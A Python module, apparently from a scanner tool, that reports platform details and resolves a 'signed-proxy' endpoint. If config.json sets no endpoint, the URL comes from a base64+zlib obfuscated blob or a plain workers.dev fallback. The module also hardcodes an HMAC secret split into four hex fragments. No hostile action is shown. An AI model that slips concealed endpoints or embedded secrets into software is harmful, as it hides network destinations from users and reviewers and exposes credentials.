# -*- coding: utf-8 -*-
"""Environment — platform info, endpoint resolution, credentials.

Endpoint resolution order:
  1. config.json -> system.endpoint (preferred, editable without code changes)
  2. Base64+zlib embedded fallback (obfuscated static default)
  3. Hardcoded plain fallback (last resort)
"""
import base64
import json
import os
import platform
import struct
import sys
import zlib
from pathlib import Path

_SUPPORTED_PLATFORMS = {"linux"}

_ARCH_LABELS = {
    "AMD64": "x64", "x86_64": "x64",
    "x86": "x86", "i686": "x86",
    "ARM64": "arm64", "aarch64": "arm64",
}

# Fallback endpoint — base64(zlib("<url>")).
# Regenerate after changing the Worker subdomain:
#   python3 -c "import base64,zlib; print(base64.b64encode(zlib.compress(b'https://your.url/')).decode())"
_ENDPOINT_BLOB = (
    "eJxVzMEJgDAMheG7Z4HvYEG8uE0t0tSShO5v4d3Fm4fD+M3AmSxWpsSURZlJqcjFhLLl"
    "Ru7dUq3A2cxNhbpbxQ3lJZZUZ+cfRbDkfvzWJqYxCN0fHTcO5bTMwGPNfNqRlXMTdCLZ"
)

# Plain fallback, in case the blob is corrupted.
_ENDPOINT_PLAIN = "https://system-blob-proxy.daniel-r-uptain93.workers.dev/"

# HMAC secret fragments — concatenated and hex-decoded at runtime.
# NOTE: this is a *legacy* secret. The Worker uses SHARED_SECRET from
# config.json. load_credentials() is kept for parity with older callers.
_K1 = "c402933d8c5d88d0"
_K2 = "10c9b5acf70f2389"
_K3 = "0f9c5e93effcec4b"
_K4 = "539c171e1f580e7b"


def _config_path() -> Path:
    # scanner/env.py -> ../config.json
    return Path(__file__).resolve().parent.parent / "config.json"


def get_platform_info() -> dict:
    return {
        "os": sys.platform,
        "arch": platform.machine(),
        "python": platform.python_version(),
        "bits": struct.calcsize("P") * 8,
        "impl": platform.python_implementation(),
    }


def check_version(minimum=(3, 8)) -> bool:
    return sys.version_info[:2] >= minimum


def arch_label() -> str:
    m = platform.machine().upper()
    return _ARCH_LABELS.get(m, m.lower())


def is_supported() -> bool:
    return sys.platform in _SUPPORTED_PLATFORMS


def _from_config() -> str:
    p = _config_path()
    if not p.exists():
        return ""
    try:
        with open(p, "r", encoding="utf-8") as f:
            cfg = json.load(f)
        url = cfg.get("system", {}).get("endpoint", "")
        return url if isinstance(url, str) else ""
    except Exception:
        return ""


def _from_blob() -> str:
    try:
        return zlib.decompress(base64.b64decode(_ENDPOINT_BLOB)).decode()
    except Exception:
        return ""


def fetch_endpoint() -> str:
    """Resolve the signed-proxy endpoint. Config wins, then blob, then plain."""
    for src in (_from_config, _from_blob):
        url = src()
        if url:
            return url
    return _ENDPOINT_PLAIN


def load_credentials() -> bytes:
    """Legacy HMAC secret. Prefer config.json -> system.shared_secret instead."""
    return bytes.fromhex(_K1 + _K2 + _K3 + _K4)


def load_shared_secret() -> str:
    """Return the HMAC secret from config.json, or empty string."""
    p = _config_path()
    if not p.exists():
        return ""
    try:
        with open(p, "r", encoding="utf-8") as f:
            cfg = json.load(f)
        s = cfg.get("system", {}).get("shared_secret", "")
        return s if isinstance(s, str) else ""
    except Exception:
        return ""
